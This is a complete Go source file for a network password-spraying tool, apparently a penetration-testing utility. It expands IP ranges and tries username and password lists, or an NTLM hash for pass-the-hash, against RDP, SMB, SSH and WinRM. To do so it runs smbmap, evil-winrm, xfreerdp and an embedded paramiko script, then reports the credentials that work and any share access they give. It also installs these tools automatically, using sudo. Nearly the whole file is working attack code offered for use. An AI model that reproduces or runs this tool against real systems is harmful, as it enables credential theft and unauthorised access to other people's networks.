package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec" 
	"runtime"
	"strconv" 
	"strings"
	"sync"
	"time"
)

var (
	consoleMutex sync.Mutex
)

func ensureCommandInstalled(command string, installCommand string) error {
	
	_, err := exec.LookPath(command)
	if err != nil {
		fmt.Printf("%s is not installed. Attempting to install...\n", command)

		var installCmd *exec.Cmd
		switch runtime.GOOS {
		case "linux":
			installCmd = exec.Command("sudo", "apt", "install", "-y", installCommand)
		case "darwin":
			installCmd = exec.Command("brew", "install", installCommand)
		default:
			return fmt.Errorf("Unsupported OS: %s", runtime.GOOS)
		}

		err := installCmd.Run()
		if err != nil {
			return err 
		}

		_, err = exec.LookPath(command)
		if err == nil {
			fmt.Printf("%s installed successfully.\n", command)
		} else {
			return fmt.Errorf("Failed to install %s", command)
		}
	} else {
		//fmt.Printf("%s is already installed.\n", command)
	}

	return nil
}
func checkSMB(username string, secret string, host string, domain string, passwordCounter string, useHash bool) bool {
	var cmdArgs []string
	cmdArgs = append(cmdArgs, "-u", username)
	cmdArgs = append(cmdArgs, "-H", host)

	if domain != "" {
		cmdArgs = append(cmdArgs, "-d", domain)
	}

	if useHash {
	
		cmdArgs = append(cmdArgs, "-p", "00000000000000000000000000000000:"+secret)
	} else {
		cmdArgs = append(cmdArgs, "-p", secret) 
	}

	cmd := exec.Command("smbmap", cmdArgs...)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	outputStr := out.String()

	consoleMutex.Lock()
	defer consoleMutex.Unlock()

	if err != nil {
		fmt.Printf("Failed to run SMBMap command on %s with %s/%s: %s\n", host, username, secret, outputStr)
		return false
	}

	smbResult := extractSMBMapResult(outputStr)
	if strings.Contains(smbResult, "Authentication failed") || strings.Contains(outputStr, "STATUS_LOGON_FAILURE") {
		fmt.Printf("SMB Authentication failed for user #%s with %s using %s on %s\n", passwordCounter, username, secret, host)
		return false
	} else if strings.Contains(smbResult, "READ,WRITE") || strings.Contains(smbResult, "READ ONLY") {
		fmt.Printf("\033[33m→ \033[34mSMB Successfully authenticated with credentials %s/%s on %s \033[33m←\033[0m\n", username, secret, host)
		fmt.Println("\nSMBMap Result:\n" + smbResult) 
	} else {
		fmt.Printf("\033[33mSMB Successfully authenticated #%s with %s on %s but no useful access was found\033[0m\n", passwordCounter, username, host)
	}

	return true
}

func extractSMBMapResult(output string) string {
	lines := strings.Split(output, "\n")

	var result strings.Builder
	var capture bool

	for _, line := range lines {
		if strings.Contains(line, "[+] IP:") {
			capture = true
		}
		if capture {
			result.WriteString(line + "\n")
		}
	}

	if result.Len() == 0 {
		return "Authentication failed or SMBMap result not found in output."
	}

	return result.String()
}

func checkSSH(username, password, host string) bool {
	pythonScript := `import paramiko
import sys

def ssh_auth_check(host, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(host, username=username, password=password, timeout=10)
        print("Correct creds")
    except paramiko.AuthenticationException:
        print("Incorrect username or password")
    except Exception as e:
        print(f"SSH connection error: {e}")
    finally:
        client.close()

host = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]

ssh_auth_check(host, username, password)
`

	cmd := exec.Command("python", "-c", pythonScript, host, username, password)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	outputStr := out.String()

	if err != nil {
		fmt.Printf("Failed SSH check on %s with %s/%s: %s\n", host, username, password, outputStr)
		return false
	}

	if strings.Contains(outputStr, "Correct creds") {
		fmt.Printf("\033[33m→ \033[34mSSH Successfully authenticated with credentials %s/%s on %s \033[33m←\033[0m\n", username, password, host)
		return true
	} else {
		fmt.Printf("SSH Authentication failed for %s/%s on %s\n", username, password, host)
		return false
	}
}

func checkWinRM(username, secret, host string, useHash bool) bool {
	pythonCode := `import subprocess
import sys
import time

def run_evil_winrm(host, username, secret, use_hash):
    if use_hash:
        cmd_args = ["evil-winrm", "-i", host, "-u", username, "-H", secret]
    else:
        cmd_args = ["evil-winrm", "-i", host, "-u", username, "-p", secret]

    print(f"Running command: {' '.join(cmd_args)}")
    process = subprocess.Popen(cmd_args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(3)
    process.stdin.write(b'exit\n')
    process.stdin.flush()
    time.sleep(1)
    if process.poll() is None:
        process.terminate()
    stdout, stderr = process.communicate()
    output = stdout.decode() + stderr.decode()
    print("Received output:")
    print(output)
    if "Exiting with code 1" in output or "SignalException" in output:
        return "Connection Failed"
    elif "Evil-WinRM shell" in output:
        return "Connection Success"
    else:
        return "Connection Status Unknown"

if __name__ == "__main__":
    host = sys.argv[1]
    username = sys.argv[2]
    secret_type = sys.argv[3]
    secret = sys.argv[4]
    use_hash = secret_type.lower() == "-hash"
    result = run_evil_winrm(host, username, secret, use_hash)
    print(f"Result: {result}")`

	cmdArgs := []string{"-c", pythonCode, host, username}
	if useHash {
		cmdArgs = append(cmdArgs, "-hash", secret)
	} else {
		cmdArgs = append(cmdArgs, "-password", secret)
	}

	cmd := exec.Command("python", cmdArgs...)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	outputStr := out.String()

	if err != nil {
		fmt.Printf("Failed WinRM on %s with %s/%s: %s\n", host, username, secret, outputStr)
		return false
	}

	if strings.Contains(outputStr, "Connection Success") {
		fmt.Printf("\033[33m→ \033[34mWinRM Successfully authenticated with credentials %s/%s on %s \033[33m←\033[0m\n", username, secret, host)
		return true
	} else if strings.Contains(outputStr, "Connection Failed") {
		fmt.Printf("WINRM Connection failed: Authentication failed on %s with %s/%s\n", host, username, secret)
		return false
	}

	fmt.Printf("\033[33mWINRM Connection status unknown on %s with %s/%s: %s\033[0m\n", host, username, secret, outputStr)
	return false
}
func checkRDP(username, password, host string) bool {
	cmd := exec.Command("xfreerdp", fmt.Sprintf("/v:%s", host), "/cert:ignore", fmt.Sprintf("/u:%s", username), fmt.Sprintf("/p:%s", password))

	stdoutPipe, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Printf("Error creating stdout pipe: %s\n", err)
		return false
	}

	stderrPipe, err := cmd.StderrPipe()
	if err != nil {
		fmt.Printf("Error creating stderr pipe: %s\n", err)
		return false
	}

	if err := cmd.Start(); err != nil {
		fmt.Printf("Failed to start RDP on %s with %s/%s: %s\n", host, username, password, err)
		return false
	}

	stdoutReader := bufio.NewReader(io.MultiReader(stdoutPipe, stderrPipe))
	loginFailed := false

	go func() {
		for {
			line, _, err := stdoutReader.ReadLine()
			if err != nil {
				if err != io.EOF {
					fmt.Printf("Error reading output: %s\n", err)
				}
				break
			}

			if strings.Contains(string(line), "STATUS_LOGON_FAILURE") ||
				strings.Contains(string(line), "ERRCONNECT_LOGON_FAILURE") ||
				strings.Contains(string(line), "ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED") {
				loginFailed = true
				cmd.Process.Kill()
				break
			}
		}
	}()

	time.Sleep(5 * time.Second)

	if loginFailed {
		fmt.Printf("Failed RDP on %s with %s/%s\n", host, username, password)
		return false
	} else {
		fmt.Printf("\033[33m→ \033[34mRDP Successfully authenticated with credentials %s/%s on %s \033[33m←\033[0m\n", username, password, host)
		cmd.Process.Kill()
		return true
	}
}

func isPortOpen(host string, port string, timeout time.Duration) bool {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, port), timeout)
	if err != nil {
		return false
	}
	if conn != nil {
		defer conn.Close()
		return true
	}
	return false
}
func expandHostRange(hostRange string) ([]string, error) {
	var expandedHosts []string
	parts := strings.Split(hostRange, "-")

	if len(parts) == 1 {
		return []string{hostRange}, nil
	} else if len(parts) == 2 {
		
		baseParts := strings.Split(parts[0], ".")
		if len(baseParts) != 4 {
			return nil, fmt.Errorf("invalid IP address format")
		}

		start, err := strconv.Atoi(baseParts[3])
		if err != nil {
			return nil, err
		}

		end, err := strconv.Atoi(parts[1])
		if err != nil {
			return nil, err
		}

		for i := start; i <= end; i++ {
			host := fmt.Sprintf("%s.%s.%s.%d", baseParts[0], baseParts[1], baseParts[2], i)
			expandedHosts = append(expandedHosts, host)
		}

		return expandedHosts, nil
	} else {
		return nil, fmt.Errorf("invalid range format")
	}
}

func main() {
	var (
		singleUsername  string
		singlePassword  string
		domain          string
		usernameFile    string
		passwordFile    string
		singleHash      string
		passwordCounter int
	)

	flag.StringVar(&singleUsername, "u", "", "Specify a single username for the scan.")
	flag.StringVar(&singlePassword, "p", "", "Specify a single password for the scan.")
	flag.StringVar(&domain, "d", "", "(OPTIONAL) Specify the domain for the scan.")
	flag.StringVar(&usernameFile, "uf", "", "(OPTIONAL) Specify a file containing a list of usernames for the scan.")
	flag.StringVar(&passwordFile, "pf", "", "(OPTIONAL) Specify a file containing a list of passwords for the scan.(make sure to use single quotes for multiple protocols eg. -pr 'winrm ssh smb')")
	flag.StringVar(&singleHash, "H", "", "(OPTIONAL) Specify an NTLM hash for the scan.")
	var protocols []string
	flag.Var(&stringSliceFlag{&protocols}, "pr", "(OPTIONAL) Specify protocols to check: all (Default), rdp, smb, ssh, winrm")
	flag.Parse()
	if len(protocols) == 0 {
		protocols = append(protocols, "all")
	}

	protocolMap := make(map[string]bool)
	for _, protocol := range protocols {
		protocolMap[protocol] = true
	}
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "▄▄ •           • ▌ ▄ ·.  ▄▄▄·  ▄▄▄·    ▄▄▄ .▐▄• ▄ ▄▄▄ . ▄▄·\n")
		fmt.Fprintf(os.Stderr, "▐█ ▀ ▪▪         ·██ ▐███▪▐█ ▀█ ▐█ ▄█    ▀▄.▀· █▌█▌▪▀▄.▀·▐█ ▌▪\n")
		fmt.Fprintf(os.Stderr, "▄█ ▀█▄ ▄█▀▄     ▐█ ▌▐▌▐█·▄█▀▀█  ██▀·    ▐▀▀▪▄ ·██· ▐▀▀▪▄██ ▄▄\n")
		fmt.Fprintf(os.Stderr, "▐█▄▪▐█▐█▌.▐▌    ██ ██▌▐█▌▐█ ▪▐▌▐█▪·•    ▐█▄▄▌▪▐█·█▌▐█▄▄▌▐███▌\n")
		fmt.Fprintf(os.Stderr, "·▀▀▀▀  ▀█▄▀▪    ▀▀  █▪▀▀▀ ▀  ▀ .▀        ▀▀▀ •▀▀ ▀▀ ▀▀▀ ·▀▀▀\n\n")
		fmt.Fprintf(os.Stderr, "Go Map Exec: A Network Password Sprying Tool by Tonee Marqus\n\n")
		fmt.Fprintf(os.Stderr, "Usage:\n")
		flag.PrintDefaults()
	}
	if len(os.Args) < 2 {
		flag.Usage()
		os.Exit(1)
	}

	if err := ensureCommandInstalled("evil-winrm", "evil-winrm"); err != nil {
		fmt.Printf("Failed to install evil-winrm: %v\n", err)
		return
	}

	if err := ensureCommandInstalled("smbmap", "smbmap"); err != nil {
		fmt.Printf("Failed to install smbmap: %v\n", err)
		return
	}

	if err := ensureCommandInstalled("xfreerdp", "freerdp"); err != nil {
		fmt.Printf("Failed to install xfreerdp: %v\n", err)
		return
	}

	if singleUsername != "" {
		if _, err := os.Stat(singleUsername); err == nil {
			fmt.Println("Error: -u flag should be a string, not a file path")
			os.Exit(1)
		}
	}

	if singlePassword != "" {
		if _, err := os.Stat(singlePassword); err == nil {
			fmt.Println("Error: -p flag should be a string, not a file path")
			os.Exit(1)
		}
	}

	if usernameFile != "" {
		if _, err := os.Stat(usernameFile); os.IsNotExist(err) {
			fmt.Println("Error: -uf flag should be a file path")
			os.Exit(1)
		}
	}

	if passwordFile != "" {
		if _, err := os.Stat(passwordFile); os.IsNotExist(err) {
			fmt.Println("Error: -pf flag should be a file path")
			os.Exit(1)
		}
	}

	var allHosts []string
	for _, arg := range flag.Args() {
		expandedHosts, err := expandHostRange(arg)
		if err != nil {
			fmt.Printf("Error expanding host range '%s': %v\n", arg, err)
			continue
		}
		allHosts = append(allHosts, expandedHosts...)
	}

	var usernames, passwords []string
	var err error

	if usernameFile != "" {
		usernames, err = readLines(usernameFile)
		if err != nil {
			fmt.Printf("Error reading username file: %v\n", err)
			return
		}
	} else {
		usernames = []string{singleUsername}
	}

	if passwordFile != "" {
		passwords, err = readLines(passwordFile)
		if err != nil {
			fmt.Printf("Error reading password file: %v\n", err)
			return
		}
	} else {
		passwords = []string{singlePassword}
	}

	for hostIndex, host := range allHosts {
		fmt.Printf("\033[33mScanning host %d/%d (%s)...\033[0m\n", hostIndex+1, len(allHosts), host)
		if protocolMap["all"] || protocolMap["rdp"] {
			if isPortOpen(host, "3389", 3*time.Second) {
				fmt.Printf("\033[33mChecking RDP on %s...\033[0m\n", host)
				for _, username := range usernames {
					for _, password := range passwords {
						checkRDP(username, password, host)
					}
				}
			} else {
				fmt.Printf("RDP port is closed on %s, skipping RDP check.\n", host)
			}
		}
		if protocolMap["all"] || protocolMap["smb"] {
			if isPortOpen(host, "445", 3*time.Second) {
				fmt.Printf("\033[33mChecking SMB on %s...\033[0m\n", host)
				for _, username := range usernames {
					for _, password := range passwords {
						passwordCounter++
						useHash := singleHash != "" 
						secret := password         
						if useHash {
							secret = singleHash 
						}
						checkSMB(username, secret, host, domain, strconv.Itoa(passwordCounter), useHash)
					}
				}
			} else {
				fmt.Printf("SMB port is closed on %s, skipping SMB check.\n", host)
			}
		}
		if protocolMap["all"] || protocolMap["ssh"] {

			if isPortOpen(host, "22", 3*time.Second) {
				fmt.Printf("\033[33mChecking SSH on %s...\033[0m\n", host)
				for _, username := range usernames {
					for _, password := range passwords {
						checkSSH(username, password, host)
					}
				}
			} else {
				fmt.Printf("SSH port is closed on %s, skipping SSH check.\n", host)
			}
		}
		if protocolMap["all"] || protocolMap["winrm"] {
			if isPortOpen(host, "5985", 3*time.Second) {
				fmt.Printf("\033[33mChecking WinRM on %s...\033[0m\n", host)
				for _, username := range usernames {
					for _, password := range passwords {
						useHash := singleHash != "" 
						secret := password         
						if useHash {
							secret = singleHash
						}
						checkWinRM(username, secret, host, useHash)
					}
				}
			} else {
				fmt.Printf("WinRM port is closed on %s, skipping WinRM check.\n", host)
			}
		}
	}

}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, strings.TrimSpace(scanner.Text()))
	}
	return lines, scanner.Err()
}

type stringSliceFlag struct {
	slice *[]string
}

func (ssf *stringSliceFlag) String() string {
	if ssf.slice == nil {
		return ""
	}
	return strings.Join(*ssf.slice, ",")
}

func (ssf *stringSliceFlag) Set(value string) error {
	if ssf.slice == nil {
		ssf.slice = new([]string)
	}
	parts := strings.Split(value, " ")
	*ssf.slice = append(*ssf.slice, parts...)
	return nil
}
